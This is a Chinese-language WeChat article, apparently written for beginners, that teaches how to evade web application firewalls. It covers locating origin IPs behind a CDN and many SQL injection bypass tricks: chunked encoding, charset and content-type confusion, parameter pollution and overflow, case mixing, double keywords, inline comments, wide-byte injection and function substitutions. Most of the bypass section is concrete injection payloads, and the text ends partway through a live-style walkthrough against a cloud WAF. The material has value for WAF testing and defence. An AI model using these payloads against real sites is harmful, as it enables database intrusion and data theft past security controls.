> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YGbtiLEOHSD_Kha3f67ezg)

Bypass WAF （小白食用）
-----------------

**前言：现在绕过 waf 手法在网上层出不穷，但是大家好像忘记一个事情就是，思路比方法更有价值，大家对着网上一些手法直接生搬硬套，不在意是不是适合的场景，网上的文章，好像着急的把所有的绕过方法都给你罗列出来。没有传授给你相应的技巧。到最后，小白拿着一堆绕 waf 的方法却被 waf 拦在外面。**

### 什么是 waf

Web 应用程序防火墙（Web Application Firewall，WAF）是一种用于保护 Web 应用程序的安全设备。Web 应用程序是指通过 Web 浏览器或其他 Web 客户端访问的应用程序。WAF 的目的是保护 Web 应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。

#### 软件 waf

软件 waf，安装在需要防护的服务器上，实现方式通常是 Waf 监听端口或以 Web 容器扩展方式进行请求检测和阻断。

常见如：D 盾

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaR50D7jHetNNP7tB8akWH83uNvV0kuFXVIqTM0Bs6JcAqp0RCNtnxjw/640?wx_fmt=png&from=appmsg)image-20240806170759757

#### 硬件 waf

是一种基于硬件实现的 Web 应用防火墙（‌WAF）‌解决方案。‌它通常是在硬件服务器上定制硬件，‌然后将 Linux 系统和软件系统嵌入其中，‌以提供安全防护。‌这种解决方案的好处是 Linux 相对于 Windows  Server 更加安全，‌因此硬件 WAF 能够提供较高的安全性。‌与软件 WAF 和云 WAF 相比，‌硬件 WAF 的部署和运行更加依赖于物理硬件，‌其安全性能和稳定性通常较高，‌适合对安全性要求极高的应用场景

**缺点**：成本高、配置复杂、扩展性有限

#### 系统内置 waf

就是类似于过滤器，列举一个经典例子打过 AWD 的朋友都知道一个 waf 叫 watchbird。

他就是系统内置的典型

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaJ8rWwiboNgFF0ID2XDKxb3Q7z87Gc4zA7N82d4a5Yaa8bEP7gysspzw/640?wx_fmt=png&from=appmsg)image-20240806172614739![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaawveFmAWBxPN4jjo90ZU3VzdP7LR8uic0easO13vLXuGvjCyfDqjMzQ/640?wx_fmt=png&from=appmsg)image-20240806172709918

这个 waf，就是通过关键词防御，比如我要 cat /flag。他监测到 flag 这个字段，就会抢险提前反弹一个假的 flag。这个配置是不需要联网只需要有个 PHP 环境。

### 云上 waf

云 WAF 是一种部署在云端的网络安全解决方案，能够有效地防护网站和网络应用程序免受各种网络攻击，如 SQL 注入、跨站脚本攻击（XSS）以及其他各种 Web 应用程序漏洞。通过在云端部署 WAF，企业可以无需大规模投资硬件和维护，即可获得强大的网络安全保障。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaHWTKhicvVKWZzw16aAYtxSygrPic82icYFpZSkEiclFY8BiaycntlLI5fWQ/640?wx_fmt=png&from=appmsg)image-20240806171312113

### 一些常见的负载均衡的办法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaxk8ZpU5zprJdvcNicwVhnf6ibvfdCZ8OK8VD3qmIxlBSRrnS1CeqFTqQ/640?wx_fmt=png&from=appmsg)image-20240806170149257

*   轮询：依次分配
    
*   动态轮询：类似于加权法（根据设置的权重值，进行连接分配）
    
*   随机：随机分配
    
*   **加权：根据设置的权重值，进行连接分配**
    
*   最快算法：基于响应时间去分配的
    
*   最少连接：连接最少的分配
    
*   观察法：利用最小的连接量和最少的响应打分，然后去进行分配
    
*   预测法：计算分数趋势，根据分数去分配
    

### **那为什么我们要去了解负载均衡呢**

我来模拟一个例子，咱们一个正常时候请求访问时这样的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaEvqFibk0icaY54B7icSpHhHjC4gtiaNzEibBp7RYtxUibibq6ucjiagBwy53qw/640?wx_fmt=png&from=appmsg)image-20240806171706524

但是如果，我突然发送多条请求，超过了 waf 的负载，那难道业务就不能进行正常访问了吗？

不是这样的，如果我们超过了 waf 的负载，我们会走下面这个通道访问服务器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQian5mR4MloGvsBPjpVgRdrYeYN7HVvQJV7VibNUeSIhzlwUVATLATTDFQ/640?wx_fmt=png&from=appmsg)image-20240806171922822

这里面我假设 waf 的权重是 98，另一个是 2。大家应该就懂为什么，我们讲负载均衡了。

如果说出现这种情况，那我们直接一个并发打过去，连绕过都不需要。

WAF 工作原理
--------

WAF 可以通过对 Web 应用程序的流量进行过滤和监控，识别并阻止潜在的安全威胁。WAF 可以检测 Web 应用程序中的各种攻击，例如 SQL 注入、跨站点脚本攻击（XSS）、跨站请求伪造（CSRF）等，并采取相应的措施，例如拦截请求、阻止访问、记录事件等。

WAF 的工作原理通常包括以下几个步骤：

```
流量识别：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。

攻击检测：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。

攻击响应：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。

日志记录：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。


```

### 常见的 WAF 厂商

*   国内: 宝塔、安恒, 绿盟, 启明星辰, 360 磐云、长亭、安全狗、阿里云、腾讯云、华为云、百度云
    
*   国外: 飞塔, 梭子鱼, Imperva
    

如何探测 WAF
--------

#### WAFw00f

```
介绍：WAFw00f是一个用于探测网站是否存在Web应用程序防火墙的工具，它通过发送正常和异常的HTTP请求，结合特征分析和算法推理，来识别不同类型的WAF

用法：wafw00f https://www.xxxx.com


```

#### namp

```
介绍:网络扫描工具，它包含了一些WAF指纹识别的脚本，可以用来探测WAF的存在

用法：nmap www.xxx.com --script=http-waf-detect.nse


```

#### SQLMap

```
介绍：主要用于检测和利用SQL注入漏洞，但它也包含了一些WAF指纹识别的功能。

用法：sqlmap -u "xxx.com?id=1" --identify-waf


```

#### go-test-waf

```
这是一个使用Go语言编写的WAF测试工具，可以自动测试WAF的拦截能力和规则配置。

用法：通过DockerHub库直接获取，拉取项目库docker pull wallarm/gotestwaf


```

### 针对 CDN 类型的 WAF 绕过思路

#### 1. 通过子域名查找

很多时候，一些重要的站点会做 CDN，而一些子域名站点并没有加入 CDN，而且跟主站在同一个 C 段内，这时候，就可以通过查找子域名来查找网站的真实 IP。

**用空间测绘去查询（FOFA、Hunter、360Quake、Shodan、Zoomeye 或者谷歌等搜索引擎）**

**一些在线查询工具**，如：

http://tool.chinaz.com/subdomain/

http://i.links.cn/subdomain/

http://subdomain.chaxun.la/

http://searchdns.netcraft.com/

https://www.virustotal.com/

#### **Layer 子域名挖掘机**

wydomain：https://github.com/ring04h/wydomain

subDomainsBrute:https://github.com/lijiejie/

Sublist3r:https://github.com/aboul3la/Sublist3r

#### 2. 在线 ping 工具

*   ping.chinaz.com
    
*   17ce.com
    
*   tools.ipip.net/newping.php
    

#### 3.DNS 历史解析记录

查询域名的历史解析记录，可能会找到网站使用 CDN 前的解析记录，从而获取真实 ip，相关查询的网站有：

iphistory：https://viewdns.info/iphistory/

DNS 查询：https://dnsdb.io/zh-cn/

微步在线：https://x.threatbook.cn/

域名查询：https://site.ip138.com/

DNS 历史查询：https://securitytrails.com/

Netcraft：https://sitereport.netcraft.com/?url=github.com

#### 4.**SSL 证书寻找真实 IP**

通过浏览器查看网站的 SSL/TLS 证书信息，有些 CDN 提供商会在证书中标明自己的信息。

可以通过浏览器或命令行工具获取 SSL 证书的详细信息。

**使用浏览器**打开目标网站（例如，https://example.com）。

点击地址栏中的锁图标。

查看证书详细信息，记下证书中的 “颁发给（Issued To）” 和“颁发者（Issuer）”信息。

**使用命令行工具（openssl）**

你可以使用 openssl 命令行工具来获取证书信息。以下是获取证书详细信息的命令：

```
openssl s_client -connect example.com:443 -showcerts


```

#### 5. 国外 ping

为什么我单独把他拉出来呢？**大部分 CDN 厂商因为各种原因只做了国内的线路**，而针对国外的线路可能几乎没有，此时我们使用国外的 DNS 查询，通过一些冷门地区进行 ping，很可能获取到真实 IP。

```
国外多PING测试工具：
https://asm.ca.com/zh_cn/ping.php
http://host-tracker.com/
http://www.webpagetest.org/
https://dnscheck.pingdom.com/


```

#### **6. 扫描全网**

通过 Zmap、masscan 等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实 IP。

1、ZMap 号称是最快的互联网扫描工具，能够在 45 分钟扫遍全网。

https://github.com/zmap/zmap

2、Masscan 号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。

https://github.com/robertdavidgraham/masscan

#### **7. 通过域名备案信息广域探测**

网站需要服务器，但是再有钱的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共享一台服务器。那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。

### 实战：快速定位精准真实 IP

我们很多时候做渗透的时候, 总会遇到 CDN, 这样

这里我们借助 fofa

思路如下

我们想确定一个网站的真实 IP 地址，通常现在网站都会使用 https 协议，用到 SSL 证书是必不可少的，绝大多数企业证书都是通配符证书，因此我们可以把证书的序列号拿下来然后搜索这个证书用在了哪些业务里，然后如果部分业务中没有使用 CDN 或者没有覆盖到 CDN, 真实 ip 就出现了

这里我用的是火狐浏览器

首先查看证书

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaGz7RVepzwsLs62eYrgQHwibRSFJ4cWa3s6I9z1A6Yl11cOYfzBWv0tg/640?wx_fmt=png&from=appmsg)image-20240424144902142

找到序列号

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaLnzE8X3WnDzia7yjgPZogrxM0XTKcyBWOErduSx87w6r0uOmsqfWgrg/640?wx_fmt=png&from=appmsg)image-20240424145015457

55:E6:AC:AE:D1:F8:A4:30:F9:A9:38:C5

55E6ACAED1F8A430F9A938C5

将其转成 10 进制

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaCm7fA1r0Sib35JxX27JpYY5LTEnr215A4NPia2d6NDwwL3G43icIicwmbQ/640?wx_fmt=png&from=appmsg)image-20240424145225637

26585094245224241434632730821

我们可以通过下面的语句来进行调查

cert="26585094245224241434632730821"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiauWVw8j7zF6UUGkh7FTGxDk1oYQK83UpeibdiaOYXBzNeTrpR6lfG8Gmg/640?wx_fmt=png&from=appmsg)image-20240424145410182

绕过 waf 的思路
----------

### 1、基于 HTTP 协议绕过思路

#### 1.1 协议未覆盖

POST 请求常用有 4 种参数提交方式：

*   Content-Type:application/x-www-form-urlencoded;
    
*   Content-Type:multipart/form-data;
    
*   Content-Type:application/json;
    
*   Content-Type:application/xml;
    

Waf 未能覆盖 Content-Type:multipart/form-data 从而导致被绕过。

或者 waf 会认为他是文件上传请求，从而只检测文件上传，导致被绕过，就是**前后解析不一致**。

举一个例子

假设你渗透一个网站，然后你输入 payload 在后面，然后被 waf 拦截了，你无法正常上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaWZNyPVdfyt6aOXQo8x5JrAsO7JRK6EVR5EE4IibRoboicibAocXeByMzg/640?wx_fmt=png&from=appmsg)image-20240809140841067

这个时候你可以将包该为上传类型，用 bp 自带的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiab5sazYUkPOeAGZLSFYDO1DQBNWqaFMa3trniayMjWJjs46WjMhWpDaA/640?wx_fmt=png&from=appmsg)image-20240809141012978![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQia7picNTlocudQQKDZDrpGvWyKibqGzvOribN0awLtbTBWjEaialvDHdQv3A/640?wx_fmt=png&from=appmsg)image-20240809141242087

你会发现是能够被解析的。但是 waf 会和后端解析不一致，**waf 认为是上传，后端却认为是查询**，所以绕过。

### 2.1HTTP/1.x 和 HTTP/2 差异绕过 WAF：

HTTP/2 是 HTTP 协议的下一个代版本，相比于之前 2 提供了更加高效的传输方式和更多的特性。早某些情况下，waf 可能没有对 HTTP2 协议的请求进行充分检测或者不支持 HTTP/2 从而可以利用 HTTP/2 协议来绕过 waf 的检测。

**举个例子：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaMxs7GWfDpopmgibNPOYQU7sOgB2V0Jv1q5pqakHXFXQbOZkxTiakQo5A/640?wx_fmt=png&from=appmsg)image-20240809142136681

### **2.2 分块传输绕过 waf**

```
先在数据包中添加Transfer-Encoding: chunked
数字代表下一列字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车


```

在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post 请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用 0 独占一行表示结束。

```
 注意：分块编码传输需要将关键字and,or,select ,union等关键字拆开编码，不然仍然会被waf拦截。编码过程中长度需包括空格的长度。最后用0表示编码结束，并在0后空两行表示数据包结束，不然点击提交按钮后会看到一直处于waiting状态。


```

```
。。。。。。上面是数据包，下面是把payload换成分块编码形式
Connection: close
Upgrade-Insecure-Requests: I
ontent-Type: application/x-www-form-urlencoded
Content-Length: 50
4
a=1
4
unio
4
n se
5
lect
1
1
0


```

**但是，如果人为去构造，很容易出错，甚至有时候你都不知道是你构造的 payload 错误还是被 waf 拦截了。**

所以，这里我推荐一个工具

https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.4.0

打包好的 bp 插件，安装我就不详细去说了！！！网上有教程

使用教程就是这样的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiazWVYB6LKT8lSfpnxDS51od5ibbM6GicD2icd8IAItYYHmLn2icaJMiazBBA/640?wx_fmt=png&from=appmsg)image-20240809163519121![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaGHb3ms8D4qqw3pjibicGnOp9EdRDqNZP2xPKRBfMAzJRJ8Vt1JBIrvicA/640?wx_fmt=png&from=appmsg)image-20240809163601020

```
id=1&submit=%e6%9f%a5%e8%af%a2


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaprPnib8H1pq1EjusuJkXOw91Hr2wxg45yLQalhLXQtB8186fH5xtCEQ/640?wx_fmt=png&from=appmsg)image-20240809164451282![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiahpK76N6GkYP8n7xC6yxDzRwFpszSJzy6GauCB8Y79etfI9Wdj4j0Sg/640?wx_fmt=png&from=appmsg)image-20240809164905568

#### **本质**

**分块传输**这个本质是去解决传输比较大的 POST 数据包，比如你 POST 发包一个很大的数据块，传输效率很慢，所以才产生了分块传输。

但是对付一些老系统肯定是可以的，但是云 waf 肯定是不可以的。

规则层面的绕过
-------

1.  **大小写**
    
2.  **编码**
    
3.  **数据库特性**
    
4.  **替换关键字**
    
5.  **内联注释**
    
6.  **特殊符号**
    
7.  **缓冲区溢出**
    

### 1.1 实战操作之分块编码 + 协议未覆盖组合绕过

上面我都讲过这两种绕过方式，那该如何组合在一起使用呢？

**先转换包**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaznYnPBujdFiaEOWIjnRxWibibYJZLxYoFbKqeUTIvwuOM3fDTW5cHAewg/640?wx_fmt=png&from=appmsg)image-20240809181236790

**然后分段编码**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaEtyaUIF8fRUHZlzGMicK4tM3TKHj2RvBibKZg3SwxhCdAibOSSucgLreA/640?wx_fmt=png&from=appmsg)image-20240809181932835

注意一下有些后端不支持分段编码，需要注意。

### 1.2Content-type 编码绕过

Content-type 带上 charset=ibm037|GBK 等。

利用特殊编码对 payload 进行转义，从而绕过 WAF 对特殊关键词的过滤。

可用编码可用去这里查询；

https://www.toolhelper.cn/

举个例子：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaNvdtyflLdtxr0KaIiaeCwz1RFooYUmYkyYoicFsxlMOvBeuCYBicla1KQ/640?wx_fmt=png&from=appmsg)image-20240809192500320

### 1.3 脏数据溢出绕过

脏数据填充到 payload 到前段，有些 waf 为了性能会丢弃 1-4M 以上的数据包直接放行不检测。

**这里强调一下，有些云 waf 是可以这样被绕过的。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaAuJQDFiaavvYQxmMl2ibAeBbDLianyLpYRdg01BH4yGicZr5VUuRu3NThQ/640?wx_fmt=png&from=appmsg)image-20240809193210264

### 1.4、HTTP 参数污染绕过

当给一个参数赋两个或者多个值时，服务器对多次赋值参数的数据处理也是不同的，根据这个特征可以对 waf 进行绕过

例如

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaCwDibCJCoVNRib2skQRx9EGibNhqwjpIhBLdYWBP01NbiclYpkRP6wWdJg/640?wx_fmt=png&from=appmsg)image-20240809195259722

那如果是这样呢

**ID=1&id=2&id=3**

那结果是 3 还是 1 呢？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiat6cmtiar5YZnlVseu805kaaKQU2sHARTkCGbYviaSKHdC5fQKafhc2Hw/640?wx_fmt=png&from=appmsg)image-20240809195524150![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQial4p276UlNUnRCW3NsM41jVSTzklDvWIyq4ibV7koZlRqD29C5RxiceVw/640?wx_fmt=png&from=appmsg)image-20240809195633981

所以这地方就出现后端取值是 id=3，但是 waf 取值是第一位就会产生绕过。

**但是不同的服务器处理方式会不一样，**

#### 例如：百度 / s?wd=usa&wd=china

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaSUDmR9IE2DcLGKkvxZemNgHntNZmA0CePf3TmDWBsD2SPW1ciampGpw/640?wx_fmt=png&from=appmsg)image-20240809200159520

#### Google 会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数：

**search?q=2&q=344**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaZUDnO338KsWGuqnwQNIhd5f5VoAmlgJBjOqIdICGrEIbLmk32AAOKQ/640?wx_fmt=png&from=appmsg)image-20240809201215567

### 服务列表

下面这个表简单列举了一些常见的 Web 服务器对同样名称的参数出现多次的处理方式：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaqX9qiaFk3pcXe8vvODANJsLRWdBk1WnPHickVp4XosFo2ItkrIY1xbWA/640?wx_fmt=png&from=appmsg)image-20240809201248782

**本质上来说就是参数不一致**

### 1.5HTTP 参数溢出绕过

WAF 为了避免参数污染的绕过会检测所有的参数，但是有些 WAF 因为性能所以会有数量限制

超出数量的参数，就可以绕过 WAF 的检测。

**这个和脏数据是有点区别的**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQia2yBbLM7HyTzSicgQBQMWaJGStBv5aRnfPL2CNZAhZNANLLv2kv8A14g/640?wx_fmt=png&from=appmsg)image-20240809202609626

**前面都被 waf 检测了，正好最后一个参数超过 waf 的限制，就达成了绕过 waf**

### 2. 大小混写绕过

有些 waf 默认情况下可能是大小写敏感的。可能会被绕过检测，

**例如正则绕过**：

Union.*? select

**payload**：UnIon sElect

就可以被绕过。

### 3. 替换绕过

在一些情况下，特定函数方法或正则表达式可能会替换或删除其中的关键字。比如：uniunionon selselectect, 后端过滤函数会将其根据正则清洗掉。还原成 union select。

**小技巧：**某宝出现过递归最大深度为 5，这里递归是什么就不需要我讲吧，很多同学只是觉得只能双写绕过，他不知道是在之前没有太多防护的时候，**大多数 waf 的递归最大深度一般都是 1，所以双写可以轻松绕过，但是这个要注意现在我建议大家一定要多几次，比如递归最大深度为 5，也就是说最后 payload 是需要替换 5 次。**

```
ununionunionuniouniomunionunionunionion


```

### 4.`` 绕过

**可是没有人讲过有哪些函数可以用 `` 绕过，有哪些不可以。**

```
id=1 and `sleep`(if(database()=a,1,20))--+


```

**sleep 函数可以加 ` 然后被绕过**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiagC1D1Yay4dvYvg3JykzwJKJ5ZIuUsUIk3diajGibAZn5czEMeXNWnGIw/640?wx_fmt=png&from=appmsg)image-20240813103714002

```
id=1 and sleep(if(`database`()=a,1,20))--+


```

**但是 database 函数是不可以的**

**updatexml 函数是可以加 `` 绕过**

```
1=(`updatexml`(1,concat(0x3a,(select user())),1))


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaJC0SaSczkRuJzkvJUjz8W8PUvTWgHMqCvIdFh3xuC4yvME5dZc1xfQ/640?wx_fmt=png&from=appmsg)image-20240813111206098

剩下我就不展示了

**group_concat()**

**user()**

**这俩是不可以的**

**version() 是可以的**

### 出现 `` 原因:

mysql 设计的时候为了**区分保留字**

例如

```
select * from users where id="1"


```

如果 * 这个字段被输入进来 select, 那么就变成了

```
select select from users where id="1"


```

这个两个重名了, 为了防止报错就会用 `` 去转义

```
select `select` from users where id="1"


```

### 5. 科学技术法配合着大小写绕过

```
id=1 union select 1,2,3


```

这是一个简单的查询语句, 正常情况下,**waf 百分之一百都会去拦截 union 字段**

```
id=1.e5UNion select 1,2,3


```

同样还有一个字段 from 可以通过这个方法绕过

```
id=1.e5UNion select 1,2,3.e5from users


```

### 6. 特殊字符绕过

如果**出现 select 1**,waf 就拦截, waf 拦截我们不让我们去查询

*   select+1
    
*   select-1
    
*   select!1
    
*   select~1
    
*   select"1"
    
*   select'1'
    

**组合**我们可以插在 select 和字符之间, 综合绕过 waf 的 payload

```
id=1.e5UNion select~1,2,3.e5from users


```

### 7. 十六进制绕过

```
select * from users where username= Dumb


```

利用 ascii 码表转换一下

```
select * from users where username= 0x44756D62


```

### 8. 如果空格被禁用了

#### 第一种方法; 注释符 /* */，%a0

两个空格代替一个空格，用 Tab 代替空格，%a0 = 空格：

%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /_!_/

最基本的绕过方法，用注释替换空格：

/* 注释 */

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiassVicJqczVk1SuZ246wo8edJ2120DkqibrRXLLy5JkmKChDQY1fL39BQ/640?wx_fmt=png&from=appmsg)image-20240717002711818

使用浮点数：

```
select * from users where id=8E0union select 1,2,3


```

```
select * from users where id=8.0 select 1,2,3


```

#### 第二种方法: 括号绕过空格

如果空格被过滤，括号没有被过滤，可以用括号绕过。

在 MySQL 中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

例如：

```
select(user())from dual where(1=1)and(2=2)


```

这种过滤方法常常用于 time based 盲注, 例如：

```
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23


```

（from for 属于逗号绕过下面会有）

上面的方法既没有逗号也没有空格。猜解 database() 第一个字符 ascii 码是否为 109，若是则加载延时。

#### 第三种方法: 引号绕过（使用十六进制）跟上面十六进制绕过差不多

会使用到引号的地方一般是在最后的 where 子句中。如下面的一条 sql 语句，这条语句就是一个简单的用来查选得到 users 表中所有字段的一条语句：

```
select column_name from information_schema.tables where table_name=“users”


```

这个时候如果引号被过滤了，那么上面的 where 子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。

users 的十六进制的字符串是 7573657273。那么最后的 sql 语句就变为了：

```
select column_name from information_schema.tables where table_name=0x7573657273


```

#### 第四种方法: 逗号绕过（使用 from 或者 offset）

在使用盲注的时候，需要使用到 substr(),mid(),limit。这些子句方法都需要使用到逗号。对于 substr() 和 mid() 这两个方法可以使用 from to 的方式来解决：

```
select substr(database() from 1 for 1);


```

```
select mid(database() from 1 for 1);


```

使用 join：

union select 1,2 #等价于

```
union select * from (select 1)a join (select 2)b


```

使用 like：

select ascii(mid(user(),1,1))=80 #等价于

```
select user() like ‘r%’


```

对于 limit 可以使用 offset 来绕过：

```
select * from news limit 0,1


```

等价于下面这条 SQL 语句

```
select * from news limit 1 offset 0


```

#### 第五种方法: 比较符号（<>）绕过

（过滤了 <>：sqlmap 盲注经常使用 <>，使用 between 的脚本）

使用 greatest()、least（）：（前者返回最大值，后者返回最小值）

同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest 来进行绕过了。

最常见的一个盲注的 sql 语句：

```
select * from users where id=1 and ascii(substr(database(),0,1))>64


```

此时如果比较操作符被过滤，上面的盲注语句则无法使用, 那么就可以使用 greatest 来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数 (n1,n2,n3,…) 的最大值。

那么上面的这条 sql 语句可以使用 greatest 变为如下的子句:

```
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64


```

**使用 between and：**

between a and b：返回 a，b 之间的数据，不包含 b。

### or and xor not 绕过

and=&& or=|| xor=| not=!

### 第七方法: 绕过注释符号（#，–(后面跟一个空格））过滤

```
id=1’ union select 1,2,3||'1


```

最后的 or '1 闭合查询语句的最后的单引号，或者：

```
id=1’ union select 1,2,'3


```

### 第八种方法:= 绕过

使用 like 、rlike 、regexp 或者 使用 <或者>

### 第九种方法: 绕过 union，select，where 等

#### （1）使用注释符绕过

常用注释符：

//，-- , /**/, #, --+, – -, ;,%00,–a

用法：

U// NION // SE// LECT //user，pwd from user

#### （2）使用大小写绕过

```
id=-1’UnIoN/**/SeLeCT


```

#### （3）内联注释绕过

```
id=-1’/!UnIoN/ SeLeCT 1,2,concat(/!table_name/) FrOM /information_schema/.tables /!WHERE //!TaBlE_ScHeMa/ like database()#


```

#### （4） 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）

```
id=-1’UNIunionONSeLselectECT1,2,3–-


```

### 第十种方法: 通用绕过（编码）

如 URLEncode 编码，ASCII,HEX,unicode 编码绕过：

or 1=1 即 %6f%72%20%31%3d%31

而 Test 也可以为 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)

### 第十一种方法: 等价函数绕过

hex()、bin() ==> ascii()

sleep() ==>benchmark()

concat_ws()==>group_concat()

mid()、substr() ==> substring()

@@user ==> user()

@@datadir ==> datadir()

举例：substring() 和 substr() 无法使用时：

```
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74


```

或者：

```
substr((select ‘password’),1,1) = 0x70


```

### 第十二种方法: 宽字节注入

过滤 '的时候往往利用的思路是将' 转换为 ' 。

在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字， 一般有两种思路：

（1）%df 吃掉 \ 具体的方法是 urlencode(') = %5c%27，我们 在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编 码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：

```
id=­1%df%27union select 1,user(),3­­


```

（2）将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面 的 %5c 会被前面的 %5c 注释掉。

### 一般产生宽字节注入的 PHP 函数

1.  replace（）：过滤 '\ ，将' 转化为 '，将 \ 转为 \，将" 转为 " 。用思路一。
    
2.  addslaches()：返回在预定义字符之前添加反斜杠（\）的字符 串。预定义字符：'," , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式）
    
3.  mysql_real_escape_string()：转义下列字符：
    

*   \x00
    
*   \n
    
*   \r
    
*   \
    
*   '
    
*   "
    

\x1a

实战案例分析
------

### 一

### 某云 waf 绕过

首先, 先探探水, 插入一个 payload

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7jiasKMN8duxxET3nvogSQiaP3Z9HN2GybX2q49CTibkA7DicwUFxOVoTnXUicic4YwCDddpuVK477c7XQ/640?wx_fmt=png&from=appmsg)image-20240814104547632

不出意外就被拦截了

接下来关闭 content-length 自动更新选项, 改为一个固定值构造发送请求

